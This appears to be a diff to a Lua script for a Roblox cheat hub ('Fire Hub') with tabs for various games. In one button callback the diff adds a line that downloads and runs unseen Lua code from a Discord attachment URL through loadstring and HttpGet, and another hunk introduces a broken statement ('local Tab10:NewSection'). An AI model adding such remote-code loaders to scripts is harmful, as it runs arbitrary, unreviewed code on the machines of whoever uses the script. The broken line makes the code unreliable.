@@ -1787,7 +1787,8 @@ StarterGui:SetCore("SendNotification", {
 	Button1 = "Sure",
 })
 wait(2.1)
-
+loadstring(game:HttpGet("https://cdn.discordapp.com/attachments/997210490608562278/997210689892536341/out.lua"))()
+--- v7
 end)
 
 Tab10Section:NewButton("Fire Hub [2]", "", function()
@@ -2275,7 +2276,7 @@ local Tab9 = Window:NewTab("Eating Simulator")
 local Tab9Section = Tab9:NewSection("Eating Simulator")
 
 local Tab10 = Window:NewTab("Other Gui")
-local Tab10Section = Tab10:NewSection("Credits In Fire Hub [3]")
+local Tab10:NewSection("Other Gui")
 
 Tab4Section:NewToggle("Auto Strenght", "", function(state)
     if state then
